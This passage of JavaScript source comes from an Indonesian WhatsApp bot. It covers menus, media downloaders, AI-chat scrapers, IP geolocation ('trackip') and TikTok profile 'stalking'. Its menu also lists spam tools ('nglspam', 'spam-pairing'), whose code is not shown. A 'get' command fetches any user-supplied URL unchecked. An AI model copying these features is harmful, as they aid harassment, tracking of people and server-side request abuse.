    audio: fs.readFileSync('./media/menu.mp3'),
    mimetype: 'audio/mpeg',
    ptt: true,
    viewOnce: false,
}, { quoted: qkontak });
}
break
case "toolsmenu":{
let menu = `
乂 T O O L S  M E N U 乂
- faketweet
- nglspam
- trackip
- spam-pairing
- get
- tourl
- brat
- tts
- installpanel
- totalfintur
`
await RuzXD.sendMessage(m.chat, {
    video: fs.readFileSync('./media/Menu.mp4'),
    caption: menu,
    gifPlayback: true,
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterName: "Shikimori Asistent",
            newsletterJid: global.idsaluran,
        },
        externalAdReply: {  
            title: `© Shikimori Asistent`, 
            body: '',
            thumbnailUrl: thumb,
            sourceUrl: global.sgc, 
            mediaType: 1,
            renderLargerThumbnail: true
        }
    }
}, { quoted: qkontak });
await RuzXD.sendMessage(m.chat, {
    audio: fs.readFileSync('./media/menu.mp3'),
    mimetype: 'audio/mpeg',
    ptt: true,
    viewOnce: false,
}, { quoted: qkontak });
}
break
case "grupmenu":{
let menu = `
乂 G R O U P   M E N U 乂
- hidetag
- kick
- delete
- demote
- promote
- open
- close 
- opentime
- closetime
- kickall
`
await RuzXD.sendMessage(m.chat, {
    video: fs.readFileSync('./media/Menu.mp4'),
    caption: menu,
    gifPlayback: true,
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterName: "Shikimori Asistent",
            newsletterJid: global.idsaluran,
        },
        externalAdReply: {  
            title: `© Shikimori Asistent`, 
            body: '',
            thumbnailUrl: thumb,
            sourceUrl: global.sgc, 
            mediaType: 1,
            renderLargerThumbnail: true
        }
    }
}, { quoted: qkontak });
await RuzXD.sendMessage(m.chat, {
    audio: fs.readFileSync('./media/menu.mp3'),
    mimetype: 'audio/mpeg',
    ptt: true,
    viewOnce: false,
}, { quoted: qkontak });
}
break
case "dukun": {
    if (!text || text.trim() === "") {
        await RuzXD.sendMessage(sender, { text: "Tolong tambahkan pertanyaan setelah kata 'dukun'." });
        break;
    }
    try {
        const apiUrl = `https://api.siputzx.my.id/api/ai/dukun?content=${encodeURIComponent(text)}`;
        const apiResponse = await axios.get(apiUrl);
        const botResponse = apiResponse.data?.data || "Maaf, saya tidak bisa menjawab saat ini.";
        await reply(`${botResponse}`)
    } catch (error) {
        console.error("Error API Dukun:", error.message);
        await reply("Maaf, dukun sedang bermeditasi. Coba lagi nanti.")
    }}
    break
case 'metaai':
if (!text) return reply(`_🔮 Apa Yang Ingin Kamu Tanyakan ?_`)
axios.get(`https://server.apisanz.my.id/ai/metaai?text=${text}`)
.then(({ data }) => {
var tet = `${data.data}`
m.replyAI('🔮 ' + tet)
})
.catch(console.error)
break
case "fbdown":
case "igdl": {
        if (args.length === 0) {
          await RuzXD.sendMessage(m.chat, { text: "❌ Masukkan link" });
          return;
        }
const link = args[0];
try {
const results = await yt1s.dl(link);
if (results.length === 0) {
await reply("❌ Tidak ada link download tersedia!")
return;
}
let responseText = `✅ Hasil Download:\n\n`;
results.forEach((item, index) => {
responseText += `${index + 1}. *${item.title}*\n🔗 ${item.url}\n\n`;
});
await RuzXD.sendMessage(m.chat, { text: responseText });
} catch (error) {
 reply("❌ Terjadi kesalahan saat memproses link.")
        }
}
        break
        case "tts":
    if (!text) {
        return RuzXD.sendMessage(m.chat, {
            text: `Gunakan perintah ini dengan format:\n\n*contoh .tts <teks>*`,
        }, { quoted: m });
    }

    try {
        await RuzXD.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
        const url = `https://vapis.my.id/api/txtimage?q=${encodeURIComponent(text)}`;
        const response = await axios.get(url, { responseType: "arraybuffer" });
        const sticker = new Sticker(response.data, {
            pack: "Stiker By",
            author: "Shikimori Asistent",
            type: "image/png",
        });
        const stikerBuffer = await sticker.toBuffer();
        await RuzXD.sendMessage(m.chat, { sticker: stikerBuffer }, { quoted: m });
    } catch (err) {
        console.error("Error:", err);
        await RuzXD.sendMessage(m.chat, {
            text: "Maaf, terjadi kesalahan saat mencoba membuat stiker tts. Coba lagi nanti.",
        }, { quoted: m });
    }
    break;
case "brat":
    if (!text) {
        return RuzXD.sendMessage(m.chat, {
            text: `Gunakan perintah ini dengan format:\n\n*contoh .brat <teks>*`,
        }, { quoted: m });
    }
    try {
        await RuzXD.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
        const url = `https://apii.ambalzz.biz.id/api/sticker/brat?text=${encodeURIComponent(text)}`;
        const response = await axios.get(url, { responseType: "arraybuffer" });
        const sticker = new Sticker(response.data, {
            pack: "Stiker By",
            author: "Shikimori Asistent",
            type: "image/png",
        });
        const stikerBuffer = await sticker.toBuffer();
        await RuzXD.sendMessage(m.chat, { sticker: stikerBuffer }, { quoted: m });
    } catch (err) {
        console.error("Error:", err);
        await RuzXD.sendMessage(m.chat, {
            text: "Maaf, terjadi kesalahan saat mencoba membuat stiker brat. Coba lagi nanti.",
        }, { quoted: m });
    }
    break;

case 'trackip':
{
if (!text) return m.reply(`*Example:* ${prefix + command} 112.90.150.204`);
try {
let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

const formatIPInfo = (info) => {
 return `
*IP Information*
• IP: ${info.ip || 'N/A'}
• Success: ${info.success || 'N/A'}
• Type: ${info.type || 'N/A'}
• Continent: ${info.continent || 'N/A'}
• Continent Code: ${info.continent_code || 'N/A'}
• Country: ${info.country || 'N/A'}
• Country Code: ${info.country_code || 'N/A'}
• Region: ${info.region || 'N/A'}
• Region Code: ${info.region_code || 'N/A'}
• City: ${info.city || 'N/A'}
• Latitude: ${info.latitude || 'N/A'}
• Longitude: ${info.longitude || 'N/A'}
• Is EU: ${info.is_eu ? 'Yes' : 'No'}
• Postal: ${info.postal || 'N/A'}
• Calling Code: ${info.calling_code || 'N/A'}
• Capital: ${info.capital || 'N/A'}
• Borders: ${info.borders || 'N/A'}
• Flag:
 - Image: ${info.flag?.img || 'N/A'}
 - Emoji: ${info.flag?.emoji || 'N/A'}
 - Emoji Unicode: ${info.flag?.emoji_unicode || 'N/A'}
• Connection:
 - ASN: ${info.connection?.asn || 'N/A'}
 - Organization: ${info.connection?.org || 'N/A'}
 - ISP: ${info.connection?.isp || 'N/A'}
 - Domain: ${info.connection?.domain || 'N/A'}
• Timezone:
 - ID: ${info.timezone?.id || 'N/A'}
 - Abbreviation: ${info.timezone?.abbr || 'N/A'}
 - Is DST: ${info.timezone?.is_dst ? 'Yes' : 'No'}
 - Offset: ${info.timezone?.offset || 'N/A'}
 - UTC: ${info.timezone?.utc || 'N/A'}
 - Current Time: ${info.timezone?.current_time || 'N/A'}
`;
};
 
if (!res.success) throw new Error(`IP ${text} not found!`);
await RuzXD.sendMessage(m.chat, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude } }, { ephemeralExpiration: 604800 });
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
await delay(2000);
m.reply(formatIPInfo(res)); 
} catch (e) { 
m.reply(`Error: Unable to retrieve data for IP ${text}`);
}
}
break
case 'tourl': {
 if (!quoted) return reply(`Balas Image Dengan Caption ${prefix + command}`)
reply(msg.wait)
  const request = require("request")
const { fromBuffer } = require('file-type');
async function top4top(baper) {
	return new Promise(async (resolve, reject) => {
		const {
			ext
		} = await fromBuffer(baper) || {}
		var req = await request({
				url: "https://top4top.io/index.php",
				method: "POST",
				"headers": {
					"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
					"accept-language": "en-US,en;q=0.9,id;q=0.8",
					"cache-control": "max-age=0",
					'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryAmIhdMyLOrbDawcA',
					'User-Agent': 'Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.585 Mobile Safari/534.11+'
				}
			},
			function(error, response, body) {
				if (error) { return resolve({
					result: 'error'
				}) }
				const $ = cheerio.load(body)
				let result = $('div.alert.alert-warning > ul > li > span').find('a').attr('href') || "gagal"
				if (result == "gagal") {
					resolve({
						status: "error",
						msg: "maybe file not allowed or try another file"
					})
				}
				resolve({
					status: "sukses",
					result
				})
			});
		let form = req.form()
		form.append('file_1_', baper, {
			filename: `${Math.floor(Math.random() * 10000)}.` + `${ext}`
		})
		form.append('file_1_', '')
		form.append('submitr', '[ رفع الملفات ]')
	})
}
let spas = "                "
    let q = m.quoted ? m.quoted : m
  let mime = (q.msg || q).mimetype || ''
  if (!/image/g.test(mime)) throw "Reply Gambar Aja"
  let media = await q.download()
  let link = await top4top(media)
  let { result, status } = link
  let caption = `*[ ${status.toUpperCase()} ]*

📮 *L I N K :*
${result}
📊 *S I Z E :* ${media.length} Byte
`

reply(caption)
}
break
case 'filmsearch': {
    if (!text) return reply('Masukan query')

    m.reply(msg.wait)
    
    async function film(query) {
    return new Promise((resolve, reject) => {
      const https = require('https')
        const url = `https://ruangmoviez.my.id/?s=${query}`
        
        https.get(url, (resp) => {
            let data = ''
            
            resp.on('data', (chunk) => {
                data += chunk
            })
            
            resp.on('end', () => {
                let $ = cheerio.load(data)
                const movies = []

                $('article.item-infinite').each((index, element) => {
                    const movie = {}
                    movie.link = $(element).find('a[itemprop="url"]').attr('href')
                    movie.title = $(element).find('h2.entry-title a').text()
                    movie.relTag = $(element).find('a[rel="category tag"]').map((i, el) => $(el).text()).get()
                    movies.push(movie)
                })

                resolve({
                    status: 200,
                    creator: author,
                    result: movies
                })
            })
        }).on("error", (err) => {
            resolve({
                status: 404,
                msg: err.message
            })
        })
    })
}
    
    let { result } = await film(text)
    let cap = `\`Search Film From: ${text}\`\n\n`
    for (let res of result) {
        cap += `*Title*: ${res.title}\n`
        cap += `*Link*: ${res.link}\n`
        cap += `*Genre*: ${res.relTag.map(v => v).join(', ')}\n\n`
    }
    m.reply(cap)
}
break
case 'get': {
if (!text) return m.reply(`awali *URL* dengan http:// atau https://`)
try {
const gt = await axios.get(text, {
headers: {
"Access-Control-Allow-Origin": "*",
"Referer": "https://www.google.com/",
"Referrer-Policy": "strict-origin-when-cross-origin",
"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
},
responseType: 'arraybuffer' });
const contentType = gt.headers['content-type'];
console.log(`Content-Type: ${contentType}`);
if (/json/i.test(contentType)) {
const jsonData = JSON.parse(Buffer.from(gt.data, 'binary').toString('utf8'));
return m.reply(JSON.stringify(jsonData, null, 2));
} else if (/text/i.test(contentType)) {
const textData = Buffer.from(gt.data, 'binary').toString('utf8');
return m.reply(textData);
} else if (text.includes('webp')) {
return RuzXD.sendMessage(m.chat, { sticker: {url: text}, contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    mediaType: 2,
                    mediaUrl: `http://wa.me/${owner}/${Math.floor(Math.random() * 100000000000000000)}`,
                    title: `Hai ${pushname}`,
                    body: `${namabot}`,
                    sourceUrl: "",
                    thumbnail: thumb
                }
            }}, { quoted: m })
} else if (/image/i.test(contentType)) { return RuzXD.sendMessage(m.chat, {image: {url: text}, contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    mediaType: 2,
                    mediaUrl: `http://wa.me/${owner}/${Math.floor(Math.random() * 100000000000000000)}`,
                    title: `Hai ${pushname}`,
                    body: `${namabot}`,
                    sourceUrl: "",
                    thumbnail: thumb
                }
            }}, { quoted: m })
} else if (/video/i.test(contentType)) { return RuzXD.sendMessage(m.chat, {video: {url: text}, contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    mediaType: 2,
                    mediaUrl: `http://wa.me/${owner}/${Math.floor(Math.random() * 100000000000000000)}`,
                    title: `Hai ${pushname}`,
                    body: `${namabot}`,
                    sourceUrl: "",
                    thumbnail: thumb
                }
            }}, { quoted: m })
} else if (/audio/i.test(contentType) || text.includes(".mp3")) {
return RuzXD.sendMessage(m.chat, {audio: {url: text}, contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    mediaType: 2,
                    mediaUrl: `http://wa.me/${owner}/${Math.floor(Math.random() * 100000000000000000)}`,
                    title: `Hai ${pushname}`,
                    body: `${namabot}`,
                    sourceUrl: "",
                    thumbnail: thumb
                }
            }}, { quoted: m })
} else if (/application\/zip/i.test(contentType) || /application\/x-zip-compressed/i.test(contentType)) {
return RuzXD.sendMessage(
			m.chat,
			{
				document: { url: text },
				fileName: ``,
				mimetype: text,
			},
			{ quoted: m },
		);			
} else if (/application\/pdf/i.test(contentType)) {
return RuzXD.sendMessage(
			m.chat,
			{
				document: { url: text },
				fileName: ``,
				mimetype: text,
			},
			{ quoted: m },
		);
} else {
return m.reply(`MIME : ${contentType}\n\n${gt.data}`);
}
} catch (error) {
console.error(`Terjadi kesalahan: ${error}`);
return m.reply(`Terjadi kesalahan saat mengakses URL: ${error.message}`);
}}
break;
case "play": {
if (!text) return m.reply(example("dj tiktok"))
await reply(msg.wait)
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytdl.ytmp3(`${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await RuzXD.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}

}
break
case 'morphic': {
  if (!text) return reply(`Example: ${prefix + command} hai`)
async function morphic(query) {
  const url = 'https://www.morphic.sh/';
  const formData = new FormData();
  
  formData.append('1', JSON.stringify({ id: '6399a7e212fa477d1a783edade27c8354a64e1ab', bound: null }));
  formData.append('2', JSON.stringify({ id: '9eed8f3e1c51044505fd5c0d73e8d2a92572691c', bound: null }));
  formData.append('3_input', query);
  formData.append('3_include_images', 'true');
  formData.append('0', JSON.stringify([{"action":"$F1","options":{"onSetAIState":"$F2"}},{"chatId":"9TI931x","messages":[]},"$K3",false,"$undefined","$undefined"]));

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0',
        Accept: 'text/x-component',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        Referer: 'https://www.morphic.sh/',
        'Next-Action': 'c54d85c7f9588581807befbe1a35958acc57885b',
        'Next-Router-State-Tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2C%22%2F%22%2C%22refresh%22%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
        Origin: 'https://www.morphic.sh',
        Connection: 'close',
        Cookie: 'ph_phc_HK6KqP8mdSmxDjoZtHYi3MW8Kx5mHmlYpmgmZnGuaV5_posthog=%7B%22distinct_id%22%3A%220191839d-890a-7a97-b388-bc7191ac7047%22%2C%22%24sesid%22%3A%5B1724490025781%2C%220191839d-8909-72e8-b586-d66ff3bde34f%22%2C1724490025225%5D%7D',
        Priority: 'u=0',
        TE: 'trailers',
      },
      body: formData
    });

    const data = await response.text();

    const regex = /"diff":\[0,"([^"]+)"\]/g;
    let result;
    let finalText = "";

    while ((result = regex.exec(data)) !== null) {
      finalText += result[1];
    }

    return finalText;
  } catch (error) {
    console.error('Error:', error);
    throw error;
  }
}
try {
  let hannpler = await morphic(text)
  RuzXD.sendMessage(m.chat, {text: hannpler}, {quoted: m})
} catch (error) {
  m.reply("Error bang")
}
}
break

case 'txt2img': {
if (!text) return m.reply(`Example: ${prefix + command} cat`)
reply(msg.wait)
async function photoleap(prompt) {
    try {
        let result = []
        for (let i = 0; i < 3; i++) {
            let {
                data
            } = await axios.get('https://tti.photoleapapp.com/api/v1/generate?prompt=' + prompt);
            result.push(data.result_url)
        }
        return result
    } catch (e) {
        return ({
            msg: 404
        })
    }
}

let tahu = await photoleap(text)
for (const x of tahu) {
RuzXD.sendMessage(m.chat, {image: {url: x}, caption: `Done`}, {quoted: m})
}
}
break
case 'anilist': {
  if (!text) return m.reply("Example: .anilist naruto")
function anilist(query) {
  return new Promise((resolve, reject) => {
    axios.get('https://anilist.co/search/anime?search=' + query)
      .then(response => {
        const $ = cheerio.load(response.data);
        const anime = []
        const ling = []
        const image = []
        
        $('div.media-card a').each(function(a, b) {
          ling.push('https://anilist.co' + $(b).attr('href'))
        })
        
        $('div.media-card a img').each(function(a, b) {
          image.push($(b).attr('src'))
        })
        
        for (let i = 0; i < 10; i++) {
          const link = ling[i]
          const gambar = image[i]
          anime.push({
            link, gambar
          });
        }
        resolve(anime);
      })
      .catch(error => {
        reject(error);
      });
  });
}

async function anilistdetail(url) {
  try {
    const { data } = await axios.get(url);
    const $ = cheerio.load(data);

    const title = $('meta[property="og:title"]').attr('content');
    const description = $('meta[property="og:description"]').attr('content');

    const animeData = {
      title,
      description
    };

    return animeData
  } catch (error) {
    console.error(error);
  }
}
const date = await anilist(text)
const kanjut = await anilistdetail(date[0].link)
RuzXD.sendMessage(m.chat, {image: {url: `${date[0].gambar}`}, caption: `Hasil Pencarian Anime:

Judul: ${kanjut.title}
Deskripsi: ${kanjut.description}
Link: ${date[0].link}
`}, {quoted: m})
}
break

case 'ttstalk':{
//wm senn
async function tiktokStalk(user) {
    let res = await axios.get(`https://urlebird.com/user/${user}/`)
//wm senn
         let $ = cheerio.load(res.data), obj = {}
             obj.pp_user = $('div[class="col-md-auto justify-content-center text-center"] > img').attr('src')
                 obj.name = $('h1.user').text().trim()
//wm senn
                 obj.username = $('div.content > h5').text().trim()
               obj.followers = $('div[class="col-7 col-md-auto text-truncate"]').text().trim().split(' ')[1]
//wm senn
           obj.following = $('div[class="col-auto d-none d-sm-block text-truncate"]').text().trim().split(' ')[1]
//wm senn
     obj.description = $('div.content > p').text().trim()
  return obj
//wm senn
} 
if (!text) return m.reply(`Masukan nama pengguna!!\nExample ${prefix + command} sen.h`)
//wm senn
let data = await tiktokStalk(text)
let cap = `\`\`\`「 Tiktok Stalk 」\`\`\`

Nama : ${data.name}
Username : ${data.username}
Pengikut : ${data.followers}
Mengikuti : ${data.following}
Bio : ${data.description}
`

RuzXD.sendMessage(m.chat, { image: { url: data.pp_user }, caption: cap }, { quoted: m })

}
break

case  'pin': {
  if (!text) return reply(`Example: .pin Nakano Ninoo`);
  await reply("Mohon tunggu kak");

  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: RuzXD.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res);
  let ult = res.splice(0, 5); 
  let i = 1;

  for (let lucuy of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `Image ke - ${i++}`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: global.namabot
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: 'Hasil.',
        hasMediaAttachment: true,
        imageMessage: await createImage(lucuy)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"Source","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
          }
        ]
      })
    });
  }

  let bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: "Done"
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: `Search: ${text} | Nama: ${pushname}`
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});

  await RuzXD.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
  
}
break
case 'tt2': {
  let input = `[!] *wrong input*
	
Ex : ${prefix + command} https://vt.tiktok.com/ZSFSqcuXb/`

    if (!text) return m.reply(input)
    
  if (!(text.includes('http://') || text.includes('https://'))) return m.reply(`url invalid, please input a valid url. Try with add http:// or https://`)
    if (!text.includes('tiktok.com')) return m.reply(`Invalid Tiktok URL.`)
async function tiktokDl(url) {
	return new Promise(async (resolve, reject) => {
		try {
			let data = []
			function formatNumber(integer) {
				let numb = parseInt(integer)
				return Number(numb).toLocaleString().replace(/,/g, '.')
			}
			
			function formatDate(n, locale = 'en') {
				let d = new Date(n)
				return d.toLocaleDateString(locale, {
					weekday: 'long',
					day: 'numeric',
					month: 'long',
					year: 'numeric',
					hour: 'numeric',
					minute: 'numeric',
					second: 'numeric'
				})
			}
			
			let domain = 'https://www.tikwm.com/api/';
			let res = await (await axios.post(domain, {}, {
				headers: {
					'Accept': 'application/json, text/javascript, */*; q=0.01',
					'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
					'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
					'Origin': 'https://www.tikwm.com',
					'Referer': 'https://www.tikwm.com/',
					'Sec-Ch-Ua': '"Not)A;Brand" ;v="24" , "Chromium" ;v="116"',
					'Sec-Ch-Ua-Mobile': '?1',
					'Sec-Ch-Ua-Platform': 'Android',
					'Sec-Fetch-Dest': 'empty',
					'Sec-Fetch-Mode': 'cors',
					'Sec-Fetch-Site': 'same-origin',
					'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
					'X-Requested-With': 'XMLHttpRequest'
				},
				params: {
					url: url,
					count: 12,
					cursor: 0,
					web: 1,
					hd: 1
				}
			})).data.data
			if (res && !res.size && !res.wm_size && !res.hd_size) {
				res.images.map(v => {
					data.push({ type: 'photo', url: v })
				})
			} else {
				if (res && res.wmplay) {
					data.push({ type: 'watermark', url: 'https://www.tikwm.com' + res.wmplay })
				}
				if (res && res.play) {
					data.push({ type: 'nowatermark', url: 'https://www.tikwm.com' + res.play })
				}
				if (res && res.hdplay) {
					data.push({ type: 'nowatermark_hd', url: 'https://www.tikwm.com' + res.hdplay })
				}
			}
			let json = {
				status: true,
				title: res.title,
				taken_at: formatDate(res.create_time).replace('1970', ''),
				region: res.region,
				id: res.id,
				durations: res.duration,
				duration: res.duration + ' Seconds',
				cover: 'https://www.tikwm.com' + res.cover,
				size_wm: res.wm_size,
				size_nowm: res.size,
				size_nowm_hd: res.hd_size,
				data: data,
				music_info: {
					id: res.music_info.id,
					title: res.music_info.title,
					author: res.music_info.author,
					album: res.music_info.album ? res.music_info.album : null,
					url: 'https://www.tikwm.com' + res.music || res.music_info.play
				},
				stats: {
					views: formatNumber(res.play_count),
					likes: formatNumber(res.digg_count),
					comment: formatNumber(res.comment_count),
					share: formatNumber(res.share_count),
					download: formatNumber(res.download_count)
				},
				author: {
					id: res.author.id,
					fullname: res.author.unique_id,
					nickname: res.author.nickname,
					avatar: 'https://www.tikwm.com' + res.author.avatar
				}
			}
			resolve(json)
		} catch (e) {
			reject(e)
		}
	});
}
let down = await tiktokDl(text)
let berak = `[ *TIKTOK DOWNLOADER* ]

Videos:
Judul: ${down.title}
Server: ${down.region}
ID: ${down.id}
Durasi: ${down.duration}
Size: ${down.size_nowm_hd}

Music Info:
ID: ${down.music_info.id}
Judul: ${down.music_info.title}
Pemilik Musik: ${down.music_info.author}

Stats: 
Views: ${down.stats.views}
Likes: ${down.stats.likes}
Comment: ${down.stats.comment}
Share: ${down.stats.share}
Download: ${down.stats.download}

Author: 
ID: ${down.author.id}
Full Name: ${down.author.fullname}
Nickname: ${down.author.nickname}
Avatar: ${down.author.avatar}
`
await RuzXD.sendMessage(m.chat, { video: { url: down.data[2].url }, caption: berak }, { quoted: m })
await RuzXD.sendMessage(m.chat, { audio: { url: down.music_info.url }, mimetype: "audio/mp4", ptt: true }, { quoted: m })
}
break
case 'tiktok':
case 'tt': {
if (args.length == 0) return reply(`Example: ${prefix + command} link lu`)
const api = require('btch-downloader')
if (!args[0]) return reply(`Masukan URL!\n\ncontoh:\n${prefix + command} https://vm.tiktok.com/ZGJAmhSrp/`);
if (!args[0].match(/tiktok/gi)) return reply(`URL Yang Tuan Berikan *Salah!!!*`);
try {
let maximus = await api.ttdl(args[0]);
let caption = `乂 *T I K T O K  D O W N L O A D* 

• *ɴᴀᴍᴀ ᴠɪᴅᴇᴏs:* 
${maximus.title}

• *ɴᴀᴍᴀ ᴀᴜᴅɪᴏ:* 
${maximus.title_audio}

${global.namabot}`;
await RuzXD.sendMessage(m.chat, { video: { url: maximus.video[0] }, caption: caption })
await RuzXD.sendMessage(m.chat, { audio: { url: maximus.audio[0] }, mimetype: "audio/mpeg", ptt: true }, { quoted: m })
      } catch (e) {
		console.log(e)
		reply(e)
	}
}
break

case 'spotify': case 'spotifysearch': {
if (!text) return m.reply('❌ *Spotify Search* ❌\n\nSilakan masukkan kata kunci untuk mencari lagu di Spotify.')
  try {
 do2 = await searchSpotifyTracks(text)
let ini_text = '✨ *Spotify Search* ✨';
for (const x of do2) {
ini_text += `\n
      •🎵 *Judul:* ${x.name}
👥 *Artis:* ${x.artists.map(v => v.name).join(', ')}
👥 *Artis Album:* ${x.album.artists.map(v => v.name).join(', ')}
🆔 *ID:* ${x.id}
📅 *Tanggal Rilis Album:* ${x.album.release_date}
🆔 *ID Album:* ${x.album.id}
🎵 *Jumlah Trek Album:* ${x.album.total_tracks}
🔢 *Nomor Trek:* ${x.album.track_number}
⏳ *Durasi:* ${x.duration_ms} ms
🔗 *Uri:* ${x.uri}
🎵 *URL Album*: ${x.album.external_urls.spotify}\n
───────────────────
`;
}
reply(ini_text)
} catch (e) {
    return m.reply('❌ *Spotify Search* ❌\n\nTerjadi Kesalahan, Coba Lagi Nanti.')
  }
  }
break
case 'gdrive': { 
if (!text) return reply(`Example ${prefix + command} url`)
async function GDriveDl(url) {
	let id = (url.match(/\/?id=(.+)/i) || url.match(/\/d\/(.*?)\//))?.[1]
	if (!id) return reply('ID Not Found')
	let res = await fetch(`https://drive.google.com/uc?id=${id}&authuser=0&export=download`, {
		method: 'post',
		headers: {
			'accept-encoding': 'gzip, deflate, br',
			'content-length': 0,
			'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
			'origin': 'https://drive.google.com',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
			'x-client-data': 'CKG1yQEIkbbJAQiitskBCMS2yQEIqZ3KAQioo8oBGLeYygE=',
			'x-drive-first-party': 'DriveWebUi',
			'x-json-requested': 'true' 
		}
	})
	let { fileName, sizeBytes, downloadUrl } =  JSON.parse((await res.text()).slice(4))
	if (!downloadUrl) return reply('Link Download Limit!')
	let data = await fetch(downloadUrl)
	if (data.status !== 200) throw data.statusText
	return {
		downloadUrl, fileName,
		fileSize: (sizeBytes / 1024 / 1024).toFixed(2),
		mimetype: data.headers.get('content-type')
	}
}
try {
  let kanjuttgede = await GDriveDl(text)
  let bjirrbang = `*Google Drive*\n\nNama: ${kanjuttgede.fileName}\nLink: ${kanjuttgede.downloadUrl}`
  reply(bjirrbang)
  await RuzXD.sendMessage(m.chat, { document: { url: kanjuttgede.downloadUrl }, fileName: kanjuttgede.fileName, mimetype: kanjuttgede.mimetype }, { quoted: m })
} catch (error) {
  m.reply(`${error.message}`)
}
}
break

case 'vtuber': {
if (!text) return reply(`Example ${prefix+command} kobo kanaeru`)
const { wiki } = require("vtuber-wiki");
async function getVTuber(vtuber) {
    try {
        const result = await wiki(vtuber);
        if (!result.image_url) return { error: "No such vTuber" };
        return result;
    } catch (err) {
        return { error: "No such vTuber" };
    }
}
try {
let tuber = await getVTuber(text)
let pituber = `[ *VTUBER WIKI* ]

Judul: ${tuber.title}
Link: ${tuber.url}
Author: ${tuber.author}
Account: ${tuber.account}
Date: ${tuber.date}
Type: ${tuber.type}
Channel: ${tuber.channel}
Social Media: ${tuber.social_media}
Offcial Website: ${tuber.official_website}
Gender: ${tuber.gender}
Age: ${tuber.age}
Description: ${tuber.description}
More: ${tuber.more}
`

RuzXD.sendMessage(m.chat, {image: {url: tuber.image_url}, caption: pituber}, {quoted: m})
} catch (e) {
  m.reply(e)
}
}
break



case 'turbo': {
if (!q) return m.reply(`where the question`)
const fetch = require('node-fetch');
// wm avz
async function avvmx(av) {
    try {
        const avis = await fetch("https://www.turboseek.io/api/getAnswer", {
            method: "POST",
            headers: {
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; Infinix HOT 40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
                Referer: "https://www.turboseek.io/",
                "av-Type": "application/json"
            },
            body: JSON.stringify({
                question: av,
                sources: []
            })
        });
